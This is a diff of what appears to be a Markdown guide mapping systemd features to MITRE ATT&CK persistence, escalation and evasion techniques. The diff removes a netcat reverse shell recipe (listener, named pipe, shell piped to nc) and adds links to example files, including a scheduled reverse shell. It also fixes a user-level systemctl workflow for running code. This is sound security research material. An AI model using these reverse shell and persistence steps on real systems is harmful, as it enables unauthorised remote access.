@@ -6,16 +6,8 @@ I'll be using the [MITRE ATT&CK](https://attack.mitre.org/) framework to guide t
  and I'll explain the similarities and differences between systemd on Linux and the equivalent technique on Windows, if one exists.
 
 ## The Goods
-
-#### Simple Reverse Shell
-```sh
-# Stand up netcat listener
-$ nc -nlvp 4444
-# https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
-$ mknod /tmp/backpipe p
-# pipe shell's STDIN and STDOUT back to each other via backpipe
-$ /bin/sh 0</tmp/backpipe | /bin/nc 127.0.0.1 4444 1>/tmp/backpip
-```
+* [Examples/BasicService](Examples/BasicService/BasicService.md)
+* [Examples/ScheduledReverseShell](Examples/ScheduledReverseShell/ScheduledRevShell.md)
 
 ## Basic Components
 
@@ -71,7 +63,7 @@ Any access, action, or configuration change to a system that gives an adversary 
   * The following workflow would allow someone with only user permissions to execute code
     1. Link a unit file from an arbitrary location to `$HOME/.config/systemd/user`
     2. `systemctl --user daemon-reload` to reload the list of unit files in the user's context
-    3. `systemctl start $SERVICE` to run the code in the `ExecStart=` directive
+    3. `systemctl --user start $SERVICE` to run the code in the `ExecStart=` directive
 
 ### Privilege Escalation
 The result of actions that allows an adversary to obtain a higher level of permissions on a system or network.
@@ -94,7 +86,7 @@ Techniques an adversary may use to evade detection or avoid other defenses.
   Connected to the local host. Press ^] three times within 1s to exit session.
   $ id
   uid=1001(unprivileged) gid=1001(unprivileged) groups=1001(unprivileged)
-  $ 
+  $
   ```
 * [Refuse Unit Deactivation](https://www.freedesktop.org/software/systemd/man/systemd.unit.html#RefuseManualStart=)
   * A couple Unit directives, `RefuseManualStart=` and `RefuseManualStop=`, give the unit writer control over whether a normal user can start/stop a given unit
